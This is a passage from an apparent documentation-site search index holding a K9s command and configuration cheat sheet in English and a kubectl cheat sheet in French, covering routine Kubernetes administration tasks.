https://gohugo.io/getting-started/quick-start/</li> </ul>"},{"location":"cheat-sheet/k9s/k9s/","title":"K9s - Kubernetes CLI Manager","text":"<p>K9s is a terminal-based UI to interact with Kubernetes clusters, making it easier to navigate, observe, and manage deployed applications. It continuously watches Kubernetes for changes and offers commands to interact with resources.</p>"},{"location":"cheat-sheet/k9s/k9s/#cli-arguments","title":"CLI Arguments","text":""},{"location":"cheat-sheet/k9s/k9s/#basic-commands","title":"Basic Commands","text":"<pre><code># Launch K9s\nk9s\n\n# Show help and available options\nk9s help\n\n# Get info about K9s runtime (logs, configs, etc.)\nk9s info\n\n# Run K9s in a specific namespace\nk9s -n my-namespace\n\n# Launch K9s directly in pod view\nk9s -c pod\n\n# Start K9s in a different context\nk9s --context my-context\n\n# Start K9s in readonly mode (no modifications allowed)\nk9s --readonly\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#essential-key-bindings","title":"Essential Key Bindings","text":""},{"location":"cheat-sheet/k9s/k9s/#navigation-help","title":"Navigation &amp; Help","text":"Key Action Description <code>?</code> Show help Display active keyboard shortcuts and help <code>Ctrl+a</code> Show aliases List all available resource aliases <code>:q</code> or <code>Ctrl+c</code> Exit Quit K9s <code>Esc</code> Back/Cancel Exit current view/command/filter mode"},{"location":"cheat-sheet/k9s/k9s/#resource-navigation","title":"Resource Navigation","text":"Command Action Example <code>:pod\u23ce</code> View pods Shows all pods (accepts singular/plural/short names) <code>:deploy\u23ce</code> View deployments Shows all deployments <code>:svc\u23ce</code> View services Shows all services <code>:ns\u23ce</code> View namespaces Shows and allows switching namespaces <code>:ctx\u23ce</code> View contexts Shows and allows switching contexts"},{"location":"cheat-sheet/k9s/k9s/#namespace-context-operations","title":"Namespace &amp; Context Operations","text":"<pre><code># View pods in specific namespace\n:pod my-namespace\u23ce\n\n# View pods with specific context\n:pod @my-context\u23ce\n\n# Switch to namespace and keep current view\n:ns my-namespace\u23ce\n\n# Switch to context and keep current view  \n:ctx my-context\u23ce\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#filtering-search","title":"Filtering &amp; Search","text":"Command Action Example <code>/filter\u23ce</code> Filter resources <code>/nginx\u23ce</code> shows resources containing \"nginx\" <code>/!filter\u23ce</code> Inverse filter <code>/!system\u23ce</code> excludes resources containing \"system\" <code>/-l label\u23ce</code> Filter by labels <code>/-l app=nginx\u23ce</code> <code>/-f filter\u23ce</code> Fuzzy search <code>/-f web\u23ce</code> fuzzy finds \"web\""},{"location":"cheat-sheet/k9s/k9s/#label-based-filtering","title":"Label-based Filtering","text":"<pre><code># View pods with specific labels\n:pod app=nginx,env=prod\u23ce\n\n# View pods in namespace with labels\n:pod my-namespace app=web\u23ce\n\n# Filter current view by labels\n/-l app=nginx,tier=frontend\u23ce\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#resource-management","title":"Resource Management","text":""},{"location":"cheat-sheet/k9s/k9s/#common-resource-actions","title":"Common Resource Actions","text":"Key Action Description <code>d</code> Describe Show detailed resource information <code>v</code> View YAML Display resource YAML definition <code>e</code> Edit Edit resource (opens in $KUBE_EDITOR) <code>l</code> Logs View container logs <code>s</code> Shell Shell into container <code>f</code> Port-forward Forward local port to pod"},{"location":"cheat-sheet/k9s/k9s/#resource-lifecycle","title":"Resource Lifecycle","text":"Key Action Description <code>Ctrl+d</code> Delete Delete resource (with confirmation) <code>Ctrl+k</code> Kill Force delete resource (no confirmation) <code>r</code> Restart Restart resource (deployments, etc.)"},{"location":"cheat-sheet/k9s/k9s/#advanced-views","title":"Advanced Views","text":"Command Action Description <code>:pulses\u23ce</code> or <code>:pu\u23ce</code> Pulses view Cluster dashboard overview <code>:xray pod\u23ce</code> XRay view Resource dependency visualization <code>:screendump\u23ce</code> or <code>:sd\u23ce</code> Screen dump View saved resources"},{"location":"cheat-sheet/k9s/k9s/#configuration","title":"Configuration","text":""},{"location":"cheat-sheet/k9s/k9s/#main-config-file","title":"Main Config File","text":"<p>Location: <code>$XDG_CONFIG_HOME/k9s/config.yaml</code> (usually <code>~/.config/k9s/config.yaml</code>)</p> <pre><code># ~/.config/k9s/config.yaml\nk9s:\n  # UI refresh rate in seconds\n  refreshRate: 2\n\n  # Enable auto-refresh of resource views\n  liveViewAutoRefresh: false\n\n  # API server timeout\n  apiServerTimeout: 15s\n\n  # Max connection retries\n  maxConnRetry: 5\n\n  # Disable modification commands\n  readOnly: false\n\n  # Default view on startup\n  defaultView: \"pods\"\n\n  # Exit on Ctrl+C (false means use :quit command)\n  noExitOnCtrlC: false\n\n  # Port forward default address\n  portForwardAddress: localhost\n\n  ui:\n    # Enable mouse support\n    enableMouse: false\n\n    # Hide header/logo/crumbs\n    headless: false\n    logoless: false\n    crumbsless: false\n\n    # Live update UI on config changes\n    reactive: false\n\n    # Disable icons for unsupported terminals\n    noIcons: false\n\n  # Skip version check\n  skipLatestRevCheck: false\n\n  # Logs configuration\n  logger:\n    # Number of log lines to show\n    tail: 100\n    # Total log buffer size\n    buffer: 5000\n    # How far back to look in seconds (-1 for tail)\n    sinceSeconds: 300\n    # Full screen logs\n    fullScreen: false\n    # Wrap long lines\n    textWrap: false\n    # Show timestamps\n    showTime: false\n\n  # Resource thresholds for alerts\n  thresholds:\n    cpu:\n      critical: 90\n      warn: 70\n    memory:\n      critical: 90\n      warn: 70\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#context-specific-configuration","title":"Context-Specific Configuration","text":"<p>Location: <code>$XDG_DATA_HOME/k9s/clusters/{cluster}/{context}/config.yaml</code></p> <pre><code># Context-specific config\nk9s:\n  cluster: my-cluster\n  readOnly: false\n  skin: my_custom_skin\n\n  namespace:\n    active: default\n    lockFavorites: false\n    favorites:\n      - all\n      - kube-system\n      - default\n      - my-app\n\n  view:\n    active: pods\n\n  featureGates:\n    nodeShell: true\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#aliases","title":"Aliases","text":""},{"location":"cheat-sheet/k9s/k9s/#creating-custom-aliases","title":"Creating Custom Aliases","text":"<p>File: <code>$XDG_CONFIG_HOME/k9s/aliases.yaml</code></p> <pre><code># ~/.config/k9s/aliases.yaml\naliases:\n  # Resource aliases\n  pp: v1/pods                          # Use :pp instead of :pods\n  dep: apps/v1/deployments            # Use :dep instead of :deployments\n  svc: v1/services                    # Use :svc instead of :services\n  ing: networking.k8s.io/v1/ingresses # Use :ing instead of :ingresses\n\n  # Custom resource aliases\n  fred: acme.io/v1alpha1/fredericks   # Custom CRD alias\n\n  # Command aliases with filters\n  web-pods: pod default app=web                    # Pods with app=web label\n  sys-pods: pod kube-system                       # All kube-system pods\n  nginx-ing: ingress default app=nginx            # Nginx ingresses\n  critical-pods: pod -l priority=critical         # High priority pods\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#using-aliases","title":"Using Aliases","text":"<pre><code># Use aliases in command mode\n:pp\u23ce              # List pods\n:dep\u23ce             # List deployments  \n:web-pods\u23ce        # List web application pods\n:sys-pods\u23ce        # List system pods\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#hotkeys","title":"HotKeys","text":""},{"location":"cheat-sheet/k9s/k9s/#creating-custom-hotkeys","title":"Creating Custom HotKeys","text":"<p>File: <code>$XDG_DATA_HOME/k9s/hotkeys.yaml</code></p> <pre><code># ~/.local/share/k9s/hotkeys.yaml\nhotKeys:\n  # Quick navigation shortcuts\n  shift-1:\n    shortCut: Shift-1\n    description: View all pods\n    command: pods\n\n  shift-2:\n    shortCut: Shift-2\n    description: View deployments\n    command: deployments\n\n  shift-3:\n    shortCut: Shift-3\n    description: View services\n    command: services\n\n  # Filtered views\n  shift-w:\n    shortCut: Shift-w\n    description: Web application pods\n    command: pods app=web\n\n  shift-s:\n    shortCut: Shift-s\n    description: System pods\n    command: pods kube-system\n\n  # XRay views\n  shift-x:\n    shortCut: Shift-x\n    description: XRay deployments\n    command: xray deploy\n\n  # Custom namespace shortcuts\n  shift-p:\n    shortCut: Shift-p\n    description: Production namespace\n    command: pods production\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#advanced-features","title":"Advanced Features","text":""},{"location":"cheat-sheet/k9s/k9s/#xray-views","title":"XRay Views","text":"<pre><code># Visualize resource dependencies\n:xray pod my-namespace\u23ce       # Pod dependencies\n:xray svc\u23ce                    # Service dependencies  \n:xray deploy\u23ce                 # Deployment dependencies\n:xray sts\u23ce                    # StatefulSet dependencies\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#pulses-dashboard","title":"Pulses Dashboard","text":"<pre><code># Launch cluster overview dashboard\n:pulses\u23ce\n:pu\u23ce\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#log-management","title":"Log Management","text":"<pre><code># View logs with different options\nl                             # View logs (from resource view)\nCtrl+t                        # Toggle timestamp in logs\nCtrl+w                        # Toggle line wrap in logs\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#port-forwarding","title":"Port Forwarding","text":"<pre><code># Forward ports (from pod view)\nf                             # Start port forward\n# Then specify: local_port:remote_port\n8080:80                       # Forward local 8080 to pod port 80\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#shell-access","title":"Shell Access","text":"<pre><code># Shell into containers\ns                             # Shell into container\n# Select container if multiple containers in pod\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#environment-variables","title":"Environment Variables","text":""},{"location":"cheat-sheet/k9s/k9s/#global-overrides","title":"Global Overrides","text":"<pre><code># Override default port forward address\nexport K9S_DEFAULT_PF_ADDRESS=127.0.0.1\n\n# Override node shell feature globally\nexport K9S_FEATURE_GATE_NODE_SHELL=true\n\n# Set custom config directory\nexport K9S_CONFIG_DIR=/path/to/config\n\n# Set XDG directories\nexport XDG_CONFIG_HOME=$HOME/.config\nexport XDG_DATA_HOME=$HOME/.local/share\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#practical-examples","title":"Practical Examples","text":""},{"location":"cheat-sheet/k9s/k9s/#daily-workflow-examples","title":"Daily Workflow Examples","text":""},{"location":"cheat-sheet/k9s/k9s/#1-quick-pod-debugging","title":"1. Quick Pod Debugging","text":"<pre><code># Launch K9s in pod view\nk9s -c pod\n\n# Filter to problematic pods\n/error\u23ce\n\n# Describe a pod\nd\n\n# View logs\nl\n\n# Shell into container\ns\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#2-deployment-management","title":"2. Deployment Management","text":"<pre><code># View deployments\n:deploy\u23ce\n\n# Filter by namespace\n:deploy my-app\u23ce\n\n# Scale deployment (edit and change replicas)\ne\n\n# Restart deployment\nr\n\n# View deployment logs\nl\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#3-resource-monitoring","title":"3. Resource Monitoring","text":"<pre><code># Launch pulses for cluster overview\n:pulses\u23ce\n\n# Check resource usage\n:top node\u23ce\n:top pod\u23ce\n\n# Filter high CPU usage\n/-l cpu&gt;80\u23ce\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#4-multi-context-management","title":"4. Multi-Context Management","text":"<pre><code># Switch contexts\n:ctx\u23ce\n# Select context from list\n\n# View contexts with direct switch\n:ctx production\u23ce\n\n# Launch in specific context\nk9s --context staging\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#troubleshooting-workflows","title":"Troubleshooting Workflows","text":""},{"location":"cheat-sheet/k9s/k9s/#1-find-failing-pods","title":"1. Find Failing Pods","text":"<pre><code># Filter by status\n/Error\u23ce\n/CrashLoop\u23ce\n/Pending\u23ce\n\n# Or use labels to find specific app pods\n/-l app=myapp\u23ce\n\n# Describe to see events\nd\n\n# Check logs for errors\nl\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#2-resource-dependencies","title":"2. Resource Dependencies","text":"<pre><code># Use XRay to see dependencies\n:xray pod my-namespace\u23ce\n\n# Navigate through related resources\n# Follow ingress -&gt; service -&gt; deployment -&gt; pod chain\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#3-network-debugging","title":"3. Network Debugging","text":"<pre><code># View services\n:svc\u23ce\n\n# Check endpoints\n:ep\u23ce\n\n# View ingresses\n:ing\u23ce\n\n# Port forward for testing\nf\n# Test: curl localhost:8080\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#tips-best-practices","title":"Tips &amp; Best Practices","text":""},{"location":"cheat-sheet/k9s/k9s/#performance-tips","title":"Performance Tips","text":"<ul> <li>Use <code>liveViewAutoRefresh: false</code> for large clusters</li> <li>Adjust <code>refreshRate</code> based on cluster size</li> <li>Use filters to reduce displayed resources</li> <li>Enable <code>disablePodCounting</code> for very large clusters</li> </ul>"},{"location":"cheat-sheet/k9s/k9s/#security-tips","title":"Security Tips","text":"<ul> <li>Use <code>readOnly: true</code> for production environments</li> <li>Set context-specific readonly configs</li> <li>Use RBAC to limit K9s permissions</li> <li>Regularly audit your cluster access</li> </ul>"},{"location":"cheat-sheet/k9s/k9s/#customization-tips","title":"Customization Tips","text":"<ul> <li>Create aliases for frequently used commands</li> <li>Set up hotkeys for common workflows</li> <li>Use custom skins for different environments</li> <li>Configure context-specific settings</li> </ul>"},{"location":"cheat-sheet/k9s/k9s/#efficiency-tips","title":"Efficiency Tips","text":"<ul> <li>Learn regex patterns for complex filtering</li> <li>Use label selectors for precise filtering</li> <li>Master XRay views for dependency tracking</li> <li>Customize column views for important metrics</li> </ul>"},{"location":"cheat-sheet/k9s/k9s/#common-issues-solutions","title":"Common Issues &amp; Solutions","text":""},{"location":"cheat-sheet/k9s/k9s/#terminal-issues","title":"Terminal Issues","text":"<pre><code># Fix color issues\nexport TERM=xterm-256color\n\n# Fix editor issues\nexport KUBE_EDITOR=vim\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#permission-issues","title":"Permission Issues","text":"<pre><code># Check K9s permissions\nk9s info\n\n# Verify kubectl access\nkubectl auth can-i --list\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#configuration-issues","title":"Configuration Issues","text":"<pre><code># Check config location\nk9s info\n\n# Reset configuration\nrm -rf ~/.config/k9s\nrm -rf ~/.local/share/k9s\n</code></pre>"},{"location":"cheat-sheet/k9s/k9s/#resources","title":"Resources","text":"<ul> <li>Official Website: https://k9scli.io/</li> <li>GitHub Repository: https://github.com/derailed/k9s</li> <li>Community Slack: K9ers Slack</li> <li>Documentation: https://k9scli.io/topics/</li> <li>Video Tutorials: https://k9scli.io/topics/video/</li> </ul> <p>K9s makes Kubernetes cluster management intuitive and efficient through its terminal-based interface. Master these commands and configurations to significantly improve your Kubernetes workflow.</p>"},{"location":"cheat-sheet/kubectl/kubectl/","title":"kubectl - Kubernetes Command Line Tool","text":"<p>kubectl est l'outil en ligne de commande pour communiquer avec le plan de contr\u00f4le d'un cluster Kubernetes via l'API Kubernetes. C'est l'interface principale pour d\u00e9ployer des applications, inspecter et g\u00e9rer les ressources de cluster, et consulter les logs.</p>"},{"location":"cheat-sheet/kubectl/kubectl/#installation","title":"Installation","text":""},{"location":"cheat-sheet/kubectl/kubectl/#macos","title":"macOS","text":"<pre><code># Via Homebrew\nbrew install kubectl\n\n# Via MacPorts\nsudo port install kubectl\n\n# T\u00e9l\u00e9chargement direct\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/darwin/amd64/kubectl\"\nchmod +x kubectl\nsudo mv kubectl /usr/local/bin/\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#linux","title":"Linux","text":"<pre><code># Ubuntu/Debian\nsudo apt-get update &amp;&amp; sudo apt-get install -y kubectl\n\n# CentOS/RHEL/Fedora\ncat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://pkgs.k8s.io/core:/stable:/v1.31/rpm/\nenabled=1\ngpgcheck=1\ngpgkey=https://pkgs.k8s.io/core:/stable:/v1.31/rpm/repodata/repomd.xml.key\nEOF\nsudo yum install -y kubectl\n\n# T\u00e9l\u00e9chargement direct\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x kubectl\nsudo mv kubectl /usr/local/bin/\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#windows","title":"Windows","text":"<pre><code># Via Chocolatey\nchoco install kubernetes-cli\n\n# Via Scoop\nscoop install kubectl\n\n# T\u00e9l\u00e9chargement direct\ncurl.exe -LO \"https://dl.k8s.io/release/v1.31.0/bin/windows/amd64/kubectl.exe\"\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#configuration-initiale","title":"Configuration Initiale","text":""},{"location":"cheat-sheet/kubectl/kubectl/#configuration-de-base","title":"Configuration de Base","text":"<pre><code># V\u00e9rifier l'installation\nkubectl version --client\n\n# Obtenir des informations sur le cluster\nkubectl cluster-info\n\n# Configurer l'autocompl\u00e9tion Bash\nsource &lt;(kubectl completion bash)\necho \"source &lt;(kubectl completion bash)\" &gt;&gt; ~/.bashrc\n\n# Configurer l'autocompl\u00e9tion Zsh\nsource &lt;(kubectl completion zsh)\necho '[[ $commands[kubectl] ]] &amp;&amp; source &lt;(kubectl completion zsh)' &gt;&gt; ~/.zshrc\n\n# Alias utile\nalias k=kubectl\ncomplete -o default -F __start_kubectl k\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#configuration-kubeconfig","title":"Configuration kubeconfig","text":"<pre><code># Voir la configuration actuelle\nkubectl config view\n\n# Voir la configuration avec les secrets\nkubectl config view --raw\n\n# Lister les contextes disponibles\nkubectl config get-contexts\n\n# Voir le contexte actuel\nkubectl config current-context\n\n# Changer de contexte\nkubectl config use-context my-cluster\n\n# D\u00e9finir le namespace par d\u00e9faut pour le contexte actuel\nkubectl config set-context --current --namespace=my-namespace\n\n# Cr\u00e9er un nouveau contexte\nkubectl config set-context dev --user=developer --cluster=dev-cluster --namespace=development\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#syntaxe-de-base","title":"Syntaxe de Base","text":""},{"location":"cheat-sheet/kubectl/kubectl/#structure-des-commandes","title":"Structure des Commandes","text":"<pre><code>kubectl [command] [TYPE] [NAME] [flags]\n\n# Exemples\nkubectl get pods                    # Lister tous les pods\nkubectl get pod my-pod             # Obtenir un pod sp\u00e9cifique\nkubectl get pods,services          # Lister plusieurs types de ressources\nkubectl get pods -o wide           # Sortie d\u00e9taill\u00e9e\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#raccourcis-importants","title":"Raccourcis Importants","text":"<pre><code># --all-namespaces peut \u00eatre abr\u00e9g\u00e9\nkubectl get pods -A                # \u00c9quivalent \u00e0 --all-namespaces\n\n# Types de ressources avec raccourcis\nkubectl get po                     # pods\nkubectl get svc                    # services\nkubectl get deploy                 # deployments\nkubectl get rs                     # replicasets\nkubectl get ds                     # daemonsets\nkubectl get sts                    # statefulsets\nkubectl get ing                    # ingresses\nkubectl get cm                     # configmaps\nkubectl get ns                     # namespaces\nkubectl get no                     # nodes\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#gestion-des-ressources","title":"Gestion des Ressources","text":""},{"location":"cheat-sheet/kubectl/kubectl/#creation-de-ressources","title":"Cr\u00e9ation de Ressources","text":"<pre><code># Cr\u00e9er depuis un fichier\nkubectl apply -f deployment.yaml\nkubectl apply -f ./manifests/\nkubectl apply -f https://example.com/manifest.yaml\n\n# Cr\u00e9er depuis plusieurs fichiers\nkubectl apply -f app.yaml -f service.yaml\n\n# Cr\u00e9er imp\u00e9rativement\nkubectl create deployment nginx --image=nginx:1.21\nkubectl create service clusterip my-service --tcp=80:8080\nkubectl create configmap my-config --from-literal=key1=value1\nkubectl create secret generic my-secret --from-literal=password=secret123\n\n# Cr\u00e9er un Job\nkubectl create job hello --image=busybox:1.28 -- echo \"Hello World\"\n\n# Cr\u00e9er un CronJob\nkubectl create cronjob hello --image=busybox:1.28 --schedule=\"*/1 * * * *\" -- echo \"Hello World\"\n\n# G\u00e9n\u00e9ration de YAML sans cr\u00e9er\nkubectl create deployment nginx --image=nginx --dry-run=client -o yaml &gt; deployment.yaml\nkubectl run test-pod --image=busybox --dry-run=client -o yaml &gt; pod.yaml\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#consultation-de-ressources","title":"Consultation de Ressources","text":"<pre><code># Lister les ressources\nkubectl get pods\nkubectl get pods -o wide\nkubectl get pods --show-labels\nkubectl get pods -l app=nginx\nkubectl get pods --field-selector=status.phase=Running\n\n# Trier les r\u00e9sultats\nkubectl get pods --sort-by=.metadata.name\nkubectl get pods --sort-by='.status.containerStatuses[0].restartCount'\nkubectl get pv --sort-by=.spec.capacity.storage\n\n# Affichage personnalis\u00e9\nkubectl get pods -o custom-columns=NAME:.metadata.name,STATUS:.status.phase\nkubectl get nodes -o custom-columns='NODE:.metadata.name,CPU:.status.capacity.cpu,MEMORY:.status.capacity.memory'\n\n# Formats de sortie\nkubectl get pod my-pod -o yaml\nkubectl get pod my-pod -o json\nkubectl get pods -o name\nkubectl get pods -o wide\n\n# Surveillance en temps r\u00e9el\nkubectl get pods -w\nkubectl get events -w\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#description-detaillee","title":"Description D\u00e9taill\u00e9e","text":"<pre><code># D\u00e9crire des ressources\nkubectl describe node my-node\nkubectl describe pod my-pod\nkubectl describe deployment my-deployment\nkubectl describe service my-service\n\n# Obtenir des logs\nkubectl logs my-pod\nkubectl logs my-pod -c my-container          # Multi-conteneur\nkubectl logs -f my-pod                       # Suivi en temps r\u00e9el\nkubectl logs --previous my-pod               # Logs de l'instance pr\u00e9c\u00e9dente\nkubectl logs -l app=nginx                    # Logs par label\nkubectl logs deploy/my-deployment            # Logs d'un d\u00e9ploiement\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#interaction-avec-les-pods","title":"Interaction avec les Pods","text":""},{"location":"cheat-sheet/kubectl/kubectl/#execution-de-commandes","title":"Ex\u00e9cution de Commandes","text":"<pre><code># Ex\u00e9cuter une commande dans un pod\nkubectl exec my-pod -- date\nkubectl exec my-pod -c my-container -- ls /app\n\n# Shell interactif\nkubectl exec -it my-pod -- /bin/bash\nkubectl exec -it my-pod -c my-container -- /bin/sh\n\n# Cr\u00e9er un pod temporaire pour debug\nkubectl run debug --image=busybox:1.28 -it --rm -- sh\nkubectl run test --image=curlimages/curl -it --rm -- sh\n\n# Debug d'un pod existant\nkubectl debug my-pod -it --image=busybox:1.28\nkubectl debug node/my-node -it --image=busybox:1.28\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#transfert-de-fichiers","title":"Transfert de Fichiers","text":"<pre><code># Copier des fichiers vers/depuis un pod\nkubectl cp /local/file my-pod:/remote/file\nkubectl cp my-pod:/remote/file /local/file\nkubectl cp /local/dir my-pod:/remote/dir\nkubectl cp my-namespace/my-pod:/remote/file /local/file\n\n# Avec conteneur sp\u00e9cifique\nkubectl cp /local/file my-pod:/remote/file -c my-container\n\n# M\u00e9thode alternative avec tar\ntar cf - /local/dir | kubectl exec -i my-pod -- tar xf - -C /remote/\nkubectl exec my-pod -- tar cf - /remote/dir | tar xf - -C /local/\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#port-forwarding","title":"Port Forwarding","text":"<pre><code># Redirection de port simple\nkubectl port-forward pod/my-pod 8080:80\n\n# Redirection depuis un service\nkubectl port-forward service/my-service 8080:80\nkubectl port-forward svc/my-service 8080:my-service-port\n\n# Redirection depuis un d\u00e9ploiement\nkubectl port-forward deployment/my-deployment 8080:80\n\n# \u00c9couter sur toutes les interfaces\nkubectl port-forward --address 0.0.0.0 pod/my-pod 8080:80\n\n# Multiple ports\nkubectl port-forward pod/my-pod 8080:80 9090:90\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#mise-a-jour-de-ressources","title":"Mise \u00e0 Jour de Ressources","text":""},{"location":"cheat-sheet/kubectl/kubectl/#mise-a-jour-declarative","title":"Mise \u00e0 Jour D\u00e9clarative","text":"<pre><code># Appliquer des changements\nkubectl apply -f updated-deployment.yaml\n\n# \u00c9dition directe\nkubectl edit deployment my-deployment\nkubectl edit pod my-pod\nKUBE_EDITOR=\"nano\" kubectl edit svc/my-service\n\n# Mise \u00e0 jour d'image\nkubectl set image deployment/my-deployment container=nginx:1.22\nkubectl set image pod/my-pod container=nginx:1.22\n\n# Gestion des rollouts\nkubectl rollout status deployment/my-deployment\nkubectl rollout history deployment/my-deployment\nkubectl rollout undo deployment/my-deployment\nkubectl rollout undo deployment/my-deployment --to-revision=2\nkubectl rollout restart deployment/my-deployment\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#mise-a-jour-imperative-avec-patch","title":"Mise \u00e0 Jour Imp\u00e9rative avec Patch","text":"<pre><code># Patch JSON\nkubectl patch pod my-pod -p '{\"spec\":{\"containers\":[{\"name\":\"app\",\"image\":\"nginx:1.22\"}]}}'\n\n# Patch JSON avec positional arrays\nkubectl patch pod my-pod --type='json' -p='[{\"op\": \"replace\", \"path\": \"/spec/containers/0/image\", \"value\":\"nginx:1.22\"}]'\n\n# Patch de noeud\nkubectl patch node my-node -p '{\"spec\":{\"unschedulable\":true}}'\n\n# Patch de scaling\nkubectl patch deployment my-deployment -p '{\"spec\":{\"replicas\":5}}'\nkubectl patch deployment my-deployment --subresource='scale' --type='merge' -p '{\"spec\":{\"replicas\":3}}'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#labels-et-annotations","title":"Labels et Annotations","text":"<pre><code># Ajouter des labels\nkubectl label pods my-pod environment=production\nkubectl label pods my-pod tier=frontend\nkubectl label nodes my-node disk=ssd\n\n# Supprimer des labels\nkubectl label pods my-pod environment-\nkubectl label nodes my-node disk-\n\n# Modifier des labels existants\nkubectl label pods my-pod environment=staging --overwrite\n\n# Ajouter des annotations\nkubectl annotate pods my-pod description=\"My important pod\"\nkubectl annotate pods my-pod contact=\"admin@example.com\"\n\n# Supprimer des annotations\nkubectl annotate pods my-pod description-\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#scaling-et-autoscaling","title":"Scaling et Autoscaling","text":""},{"location":"cheat-sheet/kubectl/kubectl/#scaling-manuel","title":"Scaling Manuel","text":"<pre><code># Scaler un d\u00e9ploiement\nkubectl scale deployment my-deployment --replicas=5\nkubectl scale --replicas=3 deployment/my-deployment\n\n# Scaler depuis un fichier\nkubectl scale --replicas=3 -f deployment.yaml\n\n# Scaling conditionnel\nkubectl scale --current-replicas=2 --replicas=3 deployment/my-deployment\n\n# Scaler plusieurs ressources\nkubectl scale --replicas=5 rc/foo rc/bar rc/baz\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#autoscaling","title":"Autoscaling","text":"<pre><code># Cr\u00e9er un HPA\nkubectl autoscale deployment my-deployment --min=2 --max=10 --cpu-percent=80\n\n# HPA avec m\u00e9triques personnalis\u00e9es\nkubectl apply -f - &lt;&lt;EOF\napiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: my-hpa\nspec:\n  scaleTargetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: my-deployment\n  minReplicas: 2\n  maxReplicas: 10\n  metrics:\n  - type: Resource\n    resource:\n      name: cpu\n      target:\n        type: Utilization\n        averageUtilization: 80\n  - type: Resource\n    resource:\n      name: memory\n      target:\n        type: Utilization\n        averageUtilization: 70\nEOF\n\n# Voir le statut HPA\nkubectl get hpa\nkubectl describe hpa my-hpa\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#suppression-de-ressources","title":"Suppression de Ressources","text":""},{"location":"cheat-sheet/kubectl/kubectl/#suppression-basique","title":"Suppression Basique","text":"<pre><code># Supprimer depuis un fichier\nkubectl delete -f deployment.yaml\nkubectl delete -f ./manifests/\n\n# Supprimer par nom\nkubectl delete pod my-pod\nkubectl delete deployment my-deployment\nkubectl delete service my-service\n\n# Supprimer plusieurs ressources\nkubectl delete pod,service my-app\nkubectl delete pods pod1 pod2 pod3\n\n# Suppression imm\u00e9diate\nkubectl delete pod my-pod --now\nkubectl delete pod my-pod --grace-period=0 --force\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#suppression-par-selecteurs","title":"Suppression par S\u00e9lecteurs","text":"<pre><code># Supprimer par labels\nkubectl delete pods -l app=nginx\nkubectl delete all -l app=my-app\nkubectl delete pods,services -l environment=test\n\n# Supprimer tous les pods dans un namespace\nkubectl delete pods --all -n my-namespace\nkubectl delete all --all -n my-namespace\n\n# Supprimer avec pattern\nkubectl get pods --no-headers=true | awk '/error|failed/{print $1}' | xargs kubectl delete pod\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#gestion-des-namespaces","title":"Gestion des Namespaces","text":""},{"location":"cheat-sheet/kubectl/kubectl/#operations-sur-les-namespaces","title":"Op\u00e9rations sur les Namespaces","text":"<pre><code># Lister les namespaces\nkubectl get namespaces\nkubectl get ns\n\n# Cr\u00e9er un namespace\nkubectl create namespace development\nkubectl create ns production\n\n# Supprimer un namespace\nkubectl delete namespace development\n\n# Travailler dans un namespace sp\u00e9cifique\nkubectl get pods -n kube-system\nkubectl get all -n my-namespace\n\n# Voir les ressources dans tous les namespaces\nkubectl get pods -A\nkubectl get events -A --sort-by=.metadata.creationTimestamp\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#configuration-de-namespace-par-defaut","title":"Configuration de Namespace par D\u00e9faut","text":"<pre><code># Changer le namespace par d\u00e9faut\nkubectl config set-context --current --namespace=my-namespace\n\n# Alias pour changer rapidement de namespace\nalias kn='f() { [ \"$1\" ] &amp;&amp; kubectl config set-context --current --namespace $1 || kubectl config view --minify | grep namespace | cut -d\" \" -f6 ; } ; f'\n\n# Utiliser kn\nkn development      # Changer vers development\nkn                  # Voir le 